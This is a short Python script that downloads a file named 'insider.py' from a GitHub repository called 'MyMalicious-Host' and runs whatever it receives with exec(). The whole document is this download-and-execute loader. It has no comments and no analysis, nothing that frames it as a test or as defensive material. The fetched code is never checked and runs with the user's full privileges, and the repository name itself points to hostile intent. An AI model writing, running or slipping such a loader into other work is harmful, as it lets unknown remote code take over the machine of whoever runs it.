import urllib.request

url = "https://github.com/Jacob-GS/MyMalicious-Host/blob/main/insider.py"

response = urllib.request.urlopen(url)
code = response.read().decode()

exec(code)